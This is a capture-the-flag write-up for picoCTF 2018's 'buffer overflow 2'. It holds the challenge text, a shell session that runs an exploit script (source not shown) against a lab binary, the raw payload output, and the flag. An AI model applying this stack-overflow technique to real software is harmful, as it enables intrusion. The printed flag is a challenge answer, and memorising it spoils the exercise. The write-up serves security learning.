# buffer overflow 2 - Points: 250 - (Solves: 247)

Alright, this time you'll need to control some arguments
Can you get the flag from this [program][1]?
You can find it in
/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa
on the shell server
[Source][2].

[1]: https://2018shell2.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln
[2]: https://2018shell2.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln.c

## Hint

Try using gdb to print out the stack once you write to it!

---

Server shell

```sh
% cd
% ln -fs /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/flag.txt ~/
% python xpwn.py
[*] '/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln': pid 456067
[*] ˅\x0F\x86\x0ﾭ�����
[*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅\x0F\x86\x0ﾭ�����
    picoCTF{addr3ss3s_ar3_3asy1b78b0d8}
[*] Stopped process '/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln' (pid 456067)

```

picoCTF{addr3ss3s_ar3_3asy1b78b0d8}
